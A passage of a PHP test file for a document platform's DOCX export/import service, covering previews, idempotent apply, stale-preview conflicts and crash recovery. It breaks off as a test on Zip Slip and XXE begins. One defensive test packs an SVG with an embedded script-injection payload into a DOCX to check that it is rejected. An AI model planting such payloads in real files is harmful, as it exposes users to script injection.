<?php

declare(strict_types=1);

use Illuminate\Database\Schema\Blueprint;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Vaulter\Collaboration\Persistence\CommandActor;
use Vaulter\Collaboration\Persistence\CommandJournal;
use Vaulter\Collaboration\Persistence\UpdateEnvelope;
use Vaulter\Collaboration\Persistence\UpdateLog;
use Vaulter\Collaboration\RoomOwnership;
use Vaulter\Configuration\DatabaseOptions;
use Vaulter\Database\VaulterDatabase;
use Vaulter\Documents\Content\TipTap\BlockIdentity;
use Vaulter\Documents\DocumentsManager;
use Vaulter\Documents\State\CollaborativeState;
use Vaulter\Drive\Access\Roles\RoleRegistry;
use Vaulter\Drive\Enums\Access\GrantScope;
use Vaulter\Drive\Testing\Access\AccessTestHelpers;
use Vaulter\Drive\Vaulter;
use Vaulter\EditorPro\Exchange\Configuration\ExchangeOptions;
use Vaulter\EditorPro\Exchange\Contracts\BeforeArtifactLinkHook;
use Vaulter\EditorPro\Exchange\Contracts\DocxExchangeRuntime;
use Vaulter\EditorPro\Exchange\Data\ApplyExchangeImportInput;
use Vaulter\EditorPro\Exchange\Data\ExchangeRuntimeImportResult;
use Vaulter\EditorPro\Exchange\Enums\ExchangeJobState;
use Vaulter\EditorPro\Exchange\Exceptions\ExchangeException;
use Vaulter\EditorPro\Exchange\ExchangeManager;
use Vaulter\EditorPro\Exchange\Repositories\ExchangeJobRepository;
use Vaulter\EditorPro\Exchange\Runtime\CanonicalJson;
use Vaulter\EditorPro\Exchange\Runtime\NodeDocxExchangeRuntime;
use Vaulter\EditorPro\Exchange\Schema\ExchangeSchema;
use Vaulter\EditorPro\Review\Contracts\PendingSuggestionReservations;
use Vaulter\Media\Contracts\Cas\BlobPins;
use Vaulter\Media\Contracts\Cas\BlobStore;
use Vaulter\Media\Data\Snapshots\BlobSnapshot;
use Vaulter\Media\Enums\Cas\BlobStatus;
use Vaulter\Media\ValueObjects\Cas\BlobScope;
use Vaulter\ValueObjects\Access\Actor;

function sampleRichDocument(string $lead = 'Initial clause'): array
{
    return [
        'type' => 'doc',
        'content' => [
            [
                'type' => 'heading',
                'attrs' => ['blockId' => 'blk_h1', 'level' => 2],
                'content' => [
                    ['type' => 'text', 'text' => 'Contract Schedule'],
                ],
            ],
            [
                'type' => 'paragraph',
                'attrs' => ['blockId' => 'blk_p1'],
                'content' => [
                    ['type' => 'text', 'text' => $lead.' '],
                    ['type' => 'text', 'text' => 'Bold terms', 'marks' => [['type' => 'bold']]],
                    ['type' => 'text', 'text' => ' '],
                    [
                        'type' => 'text',
                        'text' => 'Reference link',
                        'marks' => [
                            ['type' => 'link', 'attrs' => ['href' => 'https://example.test/clause']],
                        ],
                    ],
                ],
            ],
            [
                'type' => 'table',
                'content' => [
                    [
                        'type' => 'tableRow',
                        'content' => [
                            [
                                'type' => 'tableHeader',
                                'attrs' => ['colspan' => 2, 'rowspan' => 2, 'colwidth' => [120, 120]],
                                'content' => [
                                    [
                                        'type' => 'paragraph',
                                        'attrs' => ['blockId' => 'blk_tbl_merged'],
                                        'content' => [
                                            ['type' => 'text', 'text' => 'Merged Header', 'marks' => [['type' => 'bold']]],
                                        ],
                                    ],
                                ],
                            ],
                            [
                                'type' => 'tableHeader',
                                'attrs' => ['colspan' => 1, 'rowspan' => 1, 'colwidth' => [120]],
                                'content' => [
                                    [
                                        'type' => 'paragraph',
                                        'attrs' => ['blockId' => 'blk_tbl_side'],
                                        'content' => [
                                            ['type' => 'text', 'text' => 'Side Header'],
                                        ],
                                    ],
                                ],
                            ],
                        ],
                    ],
                    [
                        'type' => 'tableRow',
                        'content' => [
                            [
                                'type' => 'tableCell',
                                'attrs' => ['colspan' => 1, 'rowspan' => 1, 'colwidth' => [120]],
                                'content' => [
                                    [
                                        'type' => 'paragraph',
                                        'attrs' => ['blockId' => 'blk_tbl_r2'],
                                        'content' => [
                                            ['type' => 'text', 'text' => 'Row 2 Value'],
                                        ],
                                    ],
                                ],
                            ],
                        ],
                    ],
                ],
            ],
        ],
    ];
}

/** @param array<string, string> $extraEntries */
function makeDocxZip(string $documentXml, ?string $relsXml = null, array $extraEntries = []): string
{
    $entries = [
        [
            'name' => '[Content_Types].xml',
            'data' => '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
        ],
        [
            'name' => '_rels/.rels',
            'data' => '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
        ],
        [
            'name' => 'word/document.xml',
            'data' => $documentXml,
        ],
    ];

    if ($relsXml !== null) {
        $entries[] = ['name' => 'word/_rels/document.xml.rels', 'data' => $relsXml];
    }
    foreach ($extraEntries as $name => $data) {
        $entries[] = ['name' => $name, 'data' => $data];
    }

    $parts = [];
    $central = [];
    $offset = 0;

    foreach ($entries as $entry) {
        $name = $entry['name'];
        $data = $entry['data'];
        $crc = crc32($data) & 0xFFFFFFFF;
        $compressed = gzdeflate($data, 6);
        if (! is_string($compressed)) {
            throw new RuntimeException('Deflate failed');
        }

        $compLen = strlen($compressed);
        $uncompLen = strlen($data);
        $extAttrs = 0100644 << 16;
        $nameLen = strlen($name);

        $lfh = pack('VvvvvvVVVvv', 0x04034B50, 20, 0, 8, 0, 0, $crc, $compLen, $uncompLen, $nameLen, 0).$name;
        $cd = pack('VvvvvvvVVVvvvvvVV', 0x02014B50, (3 << 8) | 20, 20, 0, 8, 0, 0, $crc, $compLen, $uncompLen, $nameLen, 0, 0, 0, 0, $extAttrs, $offset).$name;

        $parts[] = $lfh.$compressed;
        $central[] = $cd;
        $offset += strlen($lfh) + $compLen;
    }

    $cdBuf = implode('', $central);
    $eocd = pack('VvvvvVVv', 0x06054B50, 0, 0, count($entries), count($entries), strlen($cdBuf), $offset, 0);

    return implode('', $parts).$cdBuf.$eocd;
}

function commitDocxToBlob(BlobStore $blobs, int|string|null $tenantId, int|string $driveId, string $bytes): BlobSnapshot
{
    $stream = fopen('php://temp', 'w+b');
    expect($stream)->toBeResource();
    fwrite($stream, $bytes);
    rewind($stream);

    try {
        return $blobs->commit($stream, BlobScope::forUpload('tenant', $tenantId !== null ? (string) $tenantId : '0', (string) $driveId));
    } finally {
        fclose($stream);
    }
}

it('roundtrips rich documents through server DOCX export, download, import preview, explicit apply, and re-export', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $docNode = $docs->in($drive)->create('master-agreement', 'vaulter/rich-text', sampleRichDocument('Version one clause'));
    $initialHead = $docs->in($drive)->content($docNode);

    $this->actingAs($owner);

    // 1. Export DOCX via HTTP endpoint.
    $exportRes = $this->withHeaders(['Idempotency-Key' => 'http-export-1'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'exp-1',
            'kind' => 'export',
            'format' => 'docx',
            'profile_id' => 'standard',
            'source_generation' => $initialHead->epoch,
            'source_position' => $initialHead->stateVersion,
        ]);

    $exportRes->assertStatus(202)
        ->assertJsonPath('data.kind', 'export')
        ->assertJsonPath('data.format', 'docx')
        ->assertJsonPath('data.state', 'completed');

    $exportJobId = (string) $exportRes->json('data.id');
    $exportSha = (string) $exportRes->json('data.diagnostics_report.output_sha256');
    expect($exportSha)->toMatch('/\A[0-9a-f]{64}\z/');

    $statusRes = $this->getJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$exportJobId);
    $statusRes->assertOk()
        ->assertJsonPath('data.state', 'completed')
        ->assertJsonPath('data.diagnostics_report.profile', 'standard')
        ->assertJsonFragment(['code' => 'body_only_export', 'action' => 'projected']);

    // 2. Download exported DOCX artifact with security headers and verify valid OOXML ZIP.
    $fileRes = $this->get('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$exportJobId.'/file');
    $fileRes->assertOk()
        ->assertHeader('X-Content-Type-Options', 'nosniff')
        ->assertHeader('ETag', '"'.$exportSha.'"');
    expect((string) $fileRes->headers->get('Content-Type'))->toContain('wordprocessingml.document')
        ->and((string) $fileRes->headers->get('Cache-Control'))->toContain('no-store');

    $docxBytes = $fileRes->streamedContent();
    expect(hash('sha256', $docxBytes))->toBe($exportSha)
        ->and(substr($docxBytes, 0, 2))->toBe('PK');

    // 3. Re-import exported DOCX via multipart file upload -> preview_ready WITHOUT mutating working head yet.
    $upload = UploadedFile::fake()->createWithContent('agreement-edited.docx', $docxBytes);
    $importRes = $this->withHeaders(['Idempotency-Key' => 'http-import-1'])
        ->post('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'imp-multipart-1',
            'kind' => 'import',
            'format' => 'docx',
            'profile_id' => 'standard',
            'source_generation' => $initialHead->epoch,
            'source_position' => $initialHead->stateVersion,
            'file' => $upload,
        ], ['Accept' => 'application/json']);

    $importRes->assertStatus(202)
        ->assertJsonPath('data.kind', 'import')
        ->assertJsonPath('data.state', 'preview_ready');

    $importJobId = (string) $importRes->json('data.id');
    $previewRes = $this->getJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$importJobId);
    $previewRes->assertOk()
        ->assertJsonPath('data.state', 'preview_ready')
        ->assertJsonPath('data.preview.type', 'doc');

    /** @var array<string, mixed> $previewDoc */
    $previewDoc = $previewRes->json('data.preview');
    BlockIdentity::assertComplete($previewDoc);

    $encodedPreview = json_encode($previewDoc, JSON_THROW_ON_ERROR);
    expect($encodedPreview)->toContain('Version one clause')
        ->and($encodedPreview)->toContain('Bold terms')
        ->and($encodedPreview)->toContain('https:\/\/example.test\/clause')
        ->and($encodedPreview)->toContain('"colspan":2')
        ->and($encodedPreview)->toContain('"rowspan":2');

    // Verify working head has NOT changed prior to explicit apply.
    expect($docs->in($drive)->content($docNode)->stateVersion)->toBe($initialHead->stateVersion);

    // 4. Upload an external DOCX replacement via multipart upload, preview, apply, and re-export.
    $replacementXml = '<?xml version="1.0" encoding="UTF-8"?>'
        .'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        .'<w:body>'
        .'<w:p><w:r><w:t>Edited external DOCX clause</w:t></w:r></w:p>'
        .'</w:body>'
        .'</w:document>';
    $editedBytes = makeDocxZip($replacementXml);
    $editedUpload = UploadedFile::fake()->createWithContent('updated-from-word.docx', $editedBytes);

    $importEdited = $this->withHeaders(['Idempotency-Key' => 'http-import-2'])
        ->post('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'imp-edited-2',
            'kind' => 'import',
            'profile_id' => 'discussions',
            'file' => $editedUpload,
        ], ['Accept' => 'application/json'])
        ->assertStatus(202);

    $editedJobId = (string) $importEdited->json('data.id');

    $applyRes = $this->withHeaders(['Idempotency-Key' => 'http-apply-2'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$editedJobId.'/apply', [
            'apply_command_id' => 'apply-cmd-2',
            'expected_generation' => $initialHead->epoch,
            'expected_position' => $initialHead->stateVersion,
        ]);

    $applyRes->assertOk()
        ->assertJsonPath('data.state', 'applied')
        ->assertJsonPath('data.apply_command_id', 'apply-cmd-2')
        ->assertJsonPath('data.write_mode', 'snapshot')
        ->assertJsonPath('data.replayed', false);

    $receiptId = (string) $applyRes->json('data.apply_receipt_id');
    expect($receiptId)->not->toBe('');

    $headAfterApply = $docs->in($drive)->content($docNode);
    expect($headAfterApply->stateVersion)->toBe($initialHead->stateVersion + 1);
    expect(json_encode($headAfterApply->content->toArray(), JSON_THROW_ON_ERROR))
        ->toContain('Edited external DOCX clause');

    $this->getJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$editedJobId)
        ->assertOk()
        ->assertJsonPath('data.state', 'applied')
        ->assertJsonPath('data.write_mode', 'snapshot')
        ->assertJsonPath('data.applied_generation', $headAfterApply->epoch)
        ->assertJsonPath('data.applied_position', $headAfterApply->stateVersion);

    // 5. Re-export after apply and confirm updated text roundtrips back into DOCX.
    $reExport = $this->withHeaders(['Idempotency-Key' => 'http-reexport-3'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'exp-reexport-3',
            'kind' => 'export',
            'profile_id' => 'discussions',
        ])
        ->assertStatus(202)
        ->assertJsonPath('data.state', 'completed');

    $reExportBytes = $this->get('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$reExport->json('data.id').'/file')
        ->assertOk()
        ->streamedContent();

    $reImport = $this->withHeaders(['Idempotency-Key' => 'http-reimport-4'])
        ->post('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'imp-roundtrip-4',
            'kind' => 'import',
            'profile_id' => 'discussions',
            'file' => UploadedFile::fake()->createWithContent('roundtrip.docx', $reExportBytes),
        ], ['Accept' => 'application/json'])
        ->assertStatus(202);

    $reImportPreview = $this->getJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$reImport->json('data.id'))
        ->assertOk();
    expect(json_encode($reImportPreview->json('data.preview'), JSON_THROW_ON_ERROR))
        ->toContain('Edited external DOCX clause');
});

it('recovers cleanly from worker crash after Media commit before pinning, GC-sweeps orphan blob, enforces lease fencing, and retries single job (10.2-A)', function (): void {
    config()->set('vaulter-editor-pro-exchange.auto_dispatch', false);

    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $blobs = app(BlobStore::class);
    $pins = app(BlobPins::class);
    $repo = app(ExchangeJobRepository::class);

    $docNode = $docs->in($drive)->create('crash-safe', 'vaulter/rich-text', sampleRichDocument('Crash recovery check'));
    $tables = app(DatabaseOptions::class);

    $this->actingAs($owner);
    $reg = $this->withHeaders(['Idempotency-Key' => 'reg-crash-1'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'exp-crash-1',
            'kind' => 'export',
            'profile_id' => 'standard',
        ])
        ->assertStatus(202)
        ->assertJsonPath('data.state', 'queued');

    $jobId = (string) $reg->json('data.id');
    $sourceBlobId = (string) $reg->json('data.source_blob_id');
    expect($pins->countByOwner()[ExchangeJobRepository::SOURCE_PIN_OWNER] ?? 0)->toBe(1);

    $orphanBlobId = null;
    app()->instance(BeforeArtifactLinkHook::class, new class($orphanBlobId) implements BeforeArtifactLinkHook
    {
        public function __construct(private ?string &$captured) {}

        public function beforeLinkArtifact(string $jobId, BlobSnapshot $committedArtifact): void
        {
            $this->captured = $committedArtifact->id;
            throw new RuntimeException('Simulated worker crash right after Media BlobStore::commit');
        }
    });

    $ops = app(ExchangeManager::class)->forDrive($drive);
    expect(fn () => $ops->process($jobId))->toThrow(RuntimeException::class, 'Simulated worker crash');
    expect($orphanBlobId)->toBeString()->not->toBe('');
    expect($pins->countByOwner()[ExchangeJobRepository::OUTPUT_PIN_OWNER] ?? 0)->toBe(0);

    // Simulate abrupt worker SIGKILL holding an expiring lease so recover + lease fencing are both exercised.
    $staleToken = $repo->claimLease($jobId, 5);
    expect($staleToken)->toBeString();
    expect($repo->findById($jobId)?->state)->toBe(ExchangeJobState::Running);

    $baseTime = Carbon::now('UTC');
    try {
        Carbon::setTestNow($baseTime->copy()->addHours(2));

        // Fencing: stale worker cannot finalize once lease expired & was reclaimed.
        $this->artisan('vaulter-editor-pro-exchange:recover', ['--limit' => 50])
            ->assertSuccessful();
        expect($repo->findById($jobId)?->state)->toBe(ExchangeJobState::Queued);

        expect(fn () => $repo->finalizeOutput($jobId, $staleToken, ExchangeJobState::Completed, $orphanBlobId, []))
            ->toThrow(ExchangeException::class, 'lease');

        // Two-phase Media GC sweeps the unpinned orphan blob while preserving source_blob_id pin.
        $this->artisan('vaulter:blobs:gc', ['--grace' => 1])->assertSuccessful();
        $orphanRowAfterMark = DB::table($tables->table('blobs'))->where('id', $orphanBlobId)->first();
        expect($orphanRowAfterMark?->status)->toBe(BlobStatus::Tombstoned->value);

        Carbon::setTestNow($baseTime->copy()->addHours(4));
        $this->artisan('vaulter:blobs:gc', ['--grace' => 1])->assertSuccessful();
        $orphanRowAfterSweep = DB::table($tables->table('blobs'))->where('id', $orphanBlobId)->first();
        expect($orphanRowAfterSweep?->status)->toBe(BlobStatus::Deleted->value);
        expect($blobs->read($orphanBlobId))->toBeNull();

        // Source snapshot blob remains pinned and readable!
        expect($blobs->read($sourceBlobId))->toBeResource();
        expect($pins->countByOwner()[ExchangeJobRepository::SOURCE_PIN_OWNER] ?? 0)->toBe(1);

        // Remove kill hook and retry the SAME job -> completes single row with new pinned output artifact.
        app()->forgetInstance(BeforeArtifactLinkHook::class);
        $completed = $ops->process($jobId);
        expect($completed?->state)->toBe(ExchangeJobState::Completed)
            ->and($completed?->outputBlobId)->not->toBeNull()
            ->and($completed?->outputBlobId)->not->toBe($orphanBlobId)
            ->and($pins->countByOwner()[ExchangeJobRepository::OUTPUT_PIN_OWNER] ?? 0)->toBe(1)
            ->and(DB::table($tables->table('document_exchange_jobs'))->where('request_key', 'exp-crash-1')->count())->toBe(1);
    } finally {
        Carbon::setTestNow();
        app()->forgetInstance(BeforeArtifactLinkHook::class);
    }
});

it('enforces request_key idempotency, repeat apply replay with identical apply_receipt_id, and 409 conflict on mismatched params (10.2-A & 10.2-B)', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $docNode = $docs->in($drive)->create('idempotent-doc', 'vaulter/rich-text', sampleRichDocument('Baseline clause'));
    $head = $docs->in($drive)->content($docNode);

    $docxBytes = makeDocxZip('<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Idempotent applied text</w:t></w:r></w:p></w:body></w:document>');
    $this->actingAs($owner);

    $first = $this->withHeaders(['Idempotency-Key' => 'reg-key-1'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'imp-same-key',
            'kind' => 'import',
            'profile_id' => 'standard',
            'docx_b64' => base64_encode($docxBytes),
            'request_fingerprint' => str_repeat('a', 64),
        ])
        ->assertStatus(202);

    $jobId = (string) $first->json('data.id');

    // Same request_key + same params (different HTTP Idempotency-Key simulating reconnect after dropped response) replays existing job!
    $replayReg = $this->withHeaders(['Idempotency-Key' => 'reg-key-2'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'imp-same-key',
            'kind' => 'import',
            'profile_id' => 'standard',
            'docx_b64' => base64_encode($docxBytes),
            'request_fingerprint' => str_repeat('a', 64),
        ]);
    $replayReg->assertStatus(200)
        ->assertHeader('Idempotent-Replayed', 'true')
        ->assertJsonPath('data.id', $jobId);

    // Same request_key + DIFFERENT profile -> 409 idempotency conflict.
    $this->withHeaders(['Idempotency-Key' => 'reg-key-3'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'imp-same-key',
            'kind' => 'import',
            'profile_id' => 'discussions',
            'docx_b64' => base64_encode($docxBytes),
            'request_fingerprint' => str_repeat('a', 64),
        ])
        ->assertStatus(409)
        ->assertJsonPath('code', 'exchange_idempotency_conflict');

    // Apply import first time (stateVersion 1 -> 2).
    $apply1 = $this->withHeaders(['Idempotency-Key' => 'apply-http-1'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$jobId.'/apply', [
            'apply_command_id' => 'cmd-stable-42',
            'expected_generation' => $head->epoch,
            'expected_position' => $head->stateVersion,
        ])
        ->assertOk()
        ->assertJsonPath('data.replayed', false);

    $receiptId = (string) $apply1->json('data.apply_receipt_id');
    expect($receiptId)->not->toBe('')
        ->and($docs->in($drive)->content($docNode)->stateVersion)->toBe($head->stateVersion + 1);

    // Retry SAME apply_command_id AFTER owner commit (lost HTTP response scenario, even with new Idempotency-Key)
    // must return IDENTICAL apply_receipt_id without mutating the document again!
    $apply2 = $this->withHeaders(['Idempotency-Key' => 'apply-http-lost-response'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$jobId.'/apply', [
            'apply_command_id' => 'cmd-stable-42',
            'expected_generation' => $head->epoch,
            'expected_position' => $head->stateVersion,
        ]);

    $apply2->assertOk()
        ->assertHeader('Idempotent-Replayed', 'true')
        ->assertJsonPath('data.apply_receipt_id', $receiptId)
        ->assertJsonPath('data.replayed', true);
    expect($docs->in($drive)->content($docNode)->stateVersion)->toBe($head->stateVersion + 1);

    // Different apply_command_id on already-applied job -> 409 exchange_already_applied.
    $this->withHeaders(['Idempotency-Key' => 'apply-http-other'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$jobId.'/apply', [
            'apply_command_id' => 'cmd-other-99',
        ])
        ->assertStatus(409)
        ->assertJsonPath('code', 'exchange_already_applied');
});

it('rejects stale preview on apply when document head advanced after preview generation (10.2-B)', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);

    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $docNode = $docs->in($drive)->create('concurrent-doc', 'vaulter/rich-text', sampleRichDocument('Head v1'));
    $v1 = $docs->in($drive)->content($docNode);

    $this->actingAs($owner);
    $docxBytes = makeDocxZip('<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Stale import candidate</w:t></w:r></w:p></w:body></w:document>');
    $import = $this->withHeaders(['Idempotency-Key' => 'stale-reg-1'])
        ->post('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'imp-stale-1',
            'kind' => 'import',
            'profile_id' => 'standard',
            'source_generation' => $v1->epoch,
            'source_position' => $v1->stateVersion,
            'file' => UploadedFile::fake()->createWithContent('stale.docx', $docxBytes),
        ], ['Accept' => 'application/json'])
        ->assertStatus(202);

    // Advance working document head concurrently before apply!
    $v2 = $docs->in($drive)->update($docNode, sampleRichDocument('Concurrent edit v2'), expectedStateVersion: $v1->stateVersion);

    $this->withHeaders(['Idempotency-Key' => 'stale-apply-1'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs/'.$import->json('data.id').'/apply', [
            'apply_command_id' => 'cmd-stale-apply',
            'expected_generation' => $v2->epoch,
            'expected_position' => $v2->stateVersion,
        ])
        ->assertStatus(409)
        ->assertJsonPath('code', 'exchange_stale_preview');

    expect(json_encode($docs->in($drive)->content($docNode)->content->toArray(), JSON_THROW_ON_ERROR))
        ->toContain('Concurrent edit v2')
        ->not->toContain('Stale import candidate');
});

it('imports tracked-revision previews without host_revision_marks_unsupported under revisions profile, while strict-ooxml blocks native formatting revisions', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class)->in($drive);
    $doc = $docs->create('tracked-import', 'vaulter/rich-text', sampleRichDocument());
    $before = $docs->content($doc);
    $bytes = file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/d4-revisions.docx');
    expect($bytes)->toBeString();

    $url = 'api/vaulter/v1/documents/'.$doc->id.'/exchange-jobs';
    $registered = $this->actingAs($owner)->withHeaders(['Idempotency-Key' => 'tracked-reg'])
        ->postJson($url, [
            'kind' => 'import',
            'profile_id' => 'revisions',
            'docx_b64' => base64_encode($bytes),
        ])->assertStatus(202);
    $jobUrl = $url.'/'.$registered->json('data.id');
    $report = $this->getJson($jobUrl)->assertOk()
        ->assertJsonPath('data.state', 'preview_ready')
        ->assertJsonPath('data.diagnostics_report.blocked', false)
        ->json('data.diagnostics_report');
    expect(array_column($report['diagnostics'], 'code'))->not->toContain('host_revision_marks_unsupported');

    $strictReg = $this->actingAs($owner)->withHeaders(['Idempotency-Key' => 'tracked-strict-reg'])
        ->postJson($url, [
            'kind' => 'import',
            'profile_id' => 'strict-ooxml',
            'docx_b64' => base64_encode($bytes),
        ])->assertStatus(202);
    $strictUrl = $url.'/'.$strictReg->json('data.id');
    $this->getJson($strictUrl)->assertOk()
        ->assertJsonPath('data.diagnostics_report.blocked', true);

    $this->withHeaders(['Idempotency-Key' => 'tracked-strict-apply'])
        ->postJson($strictUrl.'/apply', ['apply_command_id' => 'tracked-strict-cmd'])
        ->assertStatus(422)
        ->assertJsonPath('code', 'exchange_profile_blocked');
    expect($docs->content($doc)->stateVersion)->toBe($before->stateVersion);
});

it('retains section and discussion metadata on server import without body_only warnings', function (string $fixture, string $forbiddenCode): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $doc = app(DocumentsManager::class)->in($drive)->create('metadata-retained', 'vaulter/rich-text', sampleRichDocument());
    $bytes = file_get_contents(dirname(__DIR__, 4).'/tests/corpus/docx/'.$fixture);
    expect($bytes)->toBeString();

    $url = 'api/vaulter/v1/documents/'.$doc->id.'/exchange-jobs';
    $registered = $this->actingAs($owner)->withHeaders(['Idempotency-Key' => 'metadata-retained-'.$fixture])
        ->postJson($url, [
            'kind' => 'import',
            'profile_id' => 'discussions',
            'docx_b64' => base64_encode($bytes),
        ])->assertStatus(202);

    $report = $this->getJson($url.'/'.$registered->json('data.id'))
        ->assertOk()
        ->assertJsonPath('data.state', 'preview_ready')
        ->assertJsonPath('data.diagnostics_report.blocked', false)
        ->json('data.diagnostics_report');
    expect(array_column($report['diagnostics'], 'code'))->not->toContain($forbiddenCode);
})->with([
    'sections' => ['d2-sections.docx', 'body_only_sections'],
    'discussions' => ['d3-discussions.docx', 'body_only_discussions'],
]);

it('fails an import with an unsafe embedded SVG terminally instead of requeueing it', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $docs = app(DocumentsManager::class);
    $docNode = $docs->in($drive)->create('svg-target', 'vaulter/rich-text', sampleRichDocument('Untouched safe text'));
    $before = $docs->in($drive)->content($docNode);

    // The PHP archive guard only inspects XML parts, so the scripted SVG reaches the converter,
    // which rejects it with media_svg_unsafe. That refusal is deterministic: retrying cannot help.
    $bytes = makeDocxZip(
        '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Hi</w:t></w:r></w:p></w:body></w:document>',
        extraEntries: ['word/media/evil.svg' => '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
    );

    $job = $this->actingAs($owner)->withHeaders(['Idempotency-Key' => 'svg-unsafe'])
        ->postJson('api/vaulter/v1/documents/'.$docNode->id.'/exchange-jobs', [
            'request_key' => 'svg-unsafe',
            'kind' => 'import',
            'profile_id' => 'discussions',
            'docx_b64' => base64_encode($bytes),
        ])
        ->assertStatus(202)
        ->assertJsonPath('data.state', ExchangeJobState::Failed->value)
        ->assertJsonPath('data.error_code', 'exchange_unsafe_archive')
        ->assertJsonPath('data.diagnostics_report.reason', 'media_svg_unsafe')
        ->json('data');

    expect(app(ExchangeManager::class)->reclaimExpiredLeases())->toBe([])
        ->and(app(ExchangeManager::class)->forDrive($drive)->status($docNode, (string) $job['id'])->job->state)
        ->toBe(ExchangeJobState::Failed)
        ->and($docs->in($drive)->content($docNode)->stateVersion)->toBe($before->stateVersion);
});

it('refuses to resolve a bare blob ID as an import source', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
    AccessTestHelpers::grant($storage->rootNode, RoleRegistry::OWNER, subjectId: 1);
    $drive = app(Vaulter::class)->drive($storage)->actingAs($owner);
    $doc = app(DocumentsManager::class)->in($drive)->create('blob-target', 'vaulter/rich-text', sampleRichDocument());
    $bytes = makeDocxZip('<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p/></w:body></w:document>');
    $blob = commitDocxToBlob(app(BlobStore::class), $storage->tenantId, $storage->id, $bytes);

    $this->actingAs($owner)->withHeaders(['Idempotency-Key' => 'bare-blob'])
        ->postJson('api/vaulter/v1/documents/'.$doc->id.'/exchange-jobs', [
            'kind' => 'import',
            'source_blob_id' => $blob->id,
        ])->assertForbidden();
});

it('rejects corrupt archives, Zip Slip, XXE, and disallowed external relationships on import without modifying the document (10.2-B)', function (): void {
    $owner = AccessTestHelpers::user(1);
    $storage = AccessTestHelpers::storage();
